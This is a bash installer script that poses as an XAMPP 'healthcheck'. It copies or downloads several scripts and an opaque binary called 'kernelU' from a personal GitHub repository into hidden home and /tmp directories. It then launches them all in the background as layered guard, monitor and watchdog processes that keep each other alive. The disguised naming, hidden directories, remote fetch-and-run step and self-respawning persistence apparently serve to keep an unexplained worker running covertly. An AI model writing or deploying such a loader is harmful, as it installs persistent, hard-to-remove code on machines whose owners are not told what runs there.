#!/bin/bash
# ============================================
# Installation Script (Hybrid: Local + GitHub Fallback)
# File: installation.sh
# ============================================

set -e

# ============================================
# 🔗 GitHub URL (for fallback)
# ============================================
REPO_URL="https://raw.githubusercontent.com/basilbay80/Pw1/main"

# ============================================
# Colors
# ============================================
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MAIN_DIR="$HOME/.xampp-healthcheck"
HELPER_DIR="/tmp/.xampp-helper"
GUARD_DIR="$HOME/.xampp-guard"

info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
success() { echo -e "${GREEN}[  ✓ ]${NC} $1"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
error()   { echo -e "${RED}[FAIL]${NC} $1"; }

# ============================================
# Function: Get file (local first, then download)
# ============================================
get_file() {
    local filename="$1"
    local local_path="$SCRIPT_DIR/$filename"
    local target_dir="$2"
    local target_path="$target_dir/$filename"

    # 1. If already exists in target, skip
    if [ -f "$target_path" ]; then
        success "$filename already exists in $target_dir"
        chmod +x "$target_path"
        return 0
    fi

    # 2. If exists locally (SCRIPT_DIR), copy
    if [ -f "$local_path" ]; then
        cp "$local_path" "$target_path"
        chmod +x "$target_path"
        success "$filename copied from local"
        return 0
    fi

    # 3. Otherwise DOWNLOAD from GitHub
    warn "$filename not found locally, downloading from GitHub..."

    if command -v curl > /dev/null 2>&1; then
        if curl -fsSL -o "$target_path" "${REPO_URL}/${filename}"; then
            chmod +x "$target_path"
            success "$filename downloaded"
            return 0
        fi
    fi

    if command -v wget > /dev/null 2>&1; then
        if wget -q -O "$target_path" "${REPO_URL}/${filename}"; then
            chmod +x "$target_path"
            success "$filename downloaded (wget)"
            return 0
        fi
    fi

    error "FAILED to get $filename"
    return 1
}

# ============================================
# 1. Create directories
# ============================================
echo ""
echo -e "${YELLOW}━━━ [1/5] Create Directories ━━━${NC}"
mkdir -p "$MAIN_DIR/logs"
mkdir -p "$HELPER_DIR"
mkdir -p "$GUARD_DIR"
success "Directories ready"

# ============================================
# 2. Get all files (local or GitHub)
# ============================================
echo ""
echo -e "${YELLOW}━━━ [2/5] Prepare All Scripts ━━━${NC}"

get_file "watchdog.sh"        "$MAIN_DIR"
get_file "trigger-respawn.sh" "$MAIN_DIR"
get_file "trigger-auto.sh"    "$MAIN_DIR"
get_file "monitor.sh"         "$HELPER_DIR"
get_file "guard.sh"           "$GUARD_DIR"
get_file "kernelU"            "$MAIN_DIR"

# ============================================
# 3. Chmod +x all
# ============================================
echo ""
echo -e "${YELLOW}━━━ [3/5] Chmod +x ━━━${NC}"
find "$MAIN_DIR"   -maxdepth 1 -type f \( -name "*.sh" -o -name "kernelU" \) -exec chmod +x {} \;
find "$HELPER_DIR" -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$GUARD_DIR"  -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
success "All scripts executable"

# ============================================
# 4. Kill old processes
# ============================================
echo ""
echo -e "${YELLOW}━━━ [4/5] Clean Up Old Processes ━━━${NC}"

# Kill worker first
pkill -f "$MAIN_DIR/kernelU"                2>/dev/null && warn "Old kernelU stopped"        || true
pkill -f "$MAIN_DIR/watchdog.sh"            2>/dev/null && warn "Old watchdog.sh stopped"    || true
pkill -f "$HELPER_DIR/monitor.sh"           2>/dev/null && warn "Old monitor.sh stopped"     || true
pkill -f "$GUARD_DIR/guard.sh"              2>/dev/null && warn "Old guard.sh stopped"       || true
pkill -f "$MAIN_DIR/trigger-auto.sh"        2>/dev/null && warn "Old trigger-auto.sh stopped" || true

# Also kill any legacy references (in case old versions still running)
pkill -f "\.xampp-healthcheck/runner"       2>/dev/null || true
pkill -f "\.xampp-guard/guard.sh"           2>/dev/null || true

rm -f "$MAIN_DIR/.watchdog.pid" \
      "$HELPER_DIR/.monitor.pid" \
      "$GUARD_DIR/.guard.pid" \
      "$MAIN_DIR/.trigger-auto.pid" \
      "$MAIN_DIR/.trigger"

success "Cleanup done"

# ============================================
# 5. Start all layers
# ============================================
echo ""
echo -e "${YELLOW}━━━ [5/5] Start All Layers ━━━${NC}"

nohup bash "$GUARD_DIR/guard.sh"              > /dev/null 2>&1 & success "Guard (layer 3) started"
sleep 1
nohup bash "$HELPER_DIR/monitor.sh"           > /dev/null 2>&1 & success "Monitor (layer 2) started"
sleep 1
nohup bash "$MAIN_DIR/watchdog.sh"            > /dev/null 2>&1 & success "Watchdog (layer 1) started"
sleep 1
nohup bash "$MAIN_DIR/trigger-auto.sh"        > /dev/null 2>&1 & success "Auto trigger started"

# Start worker explicitly (watchdog will also keep it alive)
cd "$MAIN_DIR"
nohup "$MAIN_DIR/kernelU" > "$MAIN_DIR/logs/runner.log" 2>&1 &
success "Worker (kernelU) started (PID: $!)"

echo ""
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅ INSTALLATION COMPLETE!            ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Check processes:${NC}  ps aux | grep -E 'kernelU|watchdog|monitor|guard|trigger'"
echo -e "${CYAN}Check logs:${NC}       tail -f $MAIN_DIR/logs/watchdog.log"
echo -e "${CYAN}Manual restart:${NC}   $MAIN_DIR/trigger-respawn.sh"
echo ""